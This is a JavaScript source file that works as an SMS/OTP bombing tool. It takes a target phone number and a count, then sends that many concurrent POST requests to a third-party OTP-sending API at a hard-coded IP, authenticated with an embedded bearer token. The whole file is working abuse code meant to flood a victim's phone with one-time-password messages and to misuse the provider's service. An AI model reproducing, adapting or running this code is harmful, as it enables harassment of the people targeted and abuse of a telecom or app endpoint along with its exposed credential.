// Function to send OTP requests
async function sendOTPRequests() {
    var number = document.getElementById("targetNumber").value;
    var amount = document.getElementById("amount").value;

    // API endpoint and headers
    var url = "http://103.4.145.86:6005/api/v1/user/otp/send";
    var headers = {
        "Authorization": "Bearer 2Comics4mh5ln64ron5t26kpvm3toBlog",
        "Content-Type": "application/json"
    };

    // Data for the request
    var data = {
        "msisdn": number,
        "operator": "robi",
        "secret_key": ""
    };

    // Clear previous logs
    var logDiv = document.getElementById("log");
    logDiv.innerHTML = "";

    var start_time = performance.now();

    try {
        // Create an array of requests and execute them concurrently
        var requests = Array.from({ length: amount }, (_, index) => sendRequest(url, headers, data, logDiv, index + 1));
        await Promise.all(requests);

        var end_time = performance.now();
        var execution_time = (end_time - start_time) / 1000; // Convert to seconds
        logDiv.innerHTML += `<p>Execution Time: ${execution_time.toFixed(2)} seconds for ${amount} requests</p>`;
    } catch (error) {
        console.error("Failed - " + error);
    }
}

// Function to send an individual request
async function sendRequest(url, headers, data, logDiv, requestNumber) {
    try {
        // Fetch data from the specified URL using POST method
        var response = await fetch(url, {
            method: 'POST',
            headers: headers,
            body: JSON.stringify(data)
        });

        // Check if the response is okay
        if (!response.ok) {
            throw new Error(`HTTP error! Status: ${response.status}`);
        }

        // Parse the response text and log the result
        var result = await response.text();
        logDiv.innerHTML += `<p>[${requestNumber}] Response: ${result}</p>`;
    } catch (error) {
        // Log if the request fails
        logDiv.innerHTML += `<p>[${requestNumber}] Failed - ${error.message}</p>`;
    }
}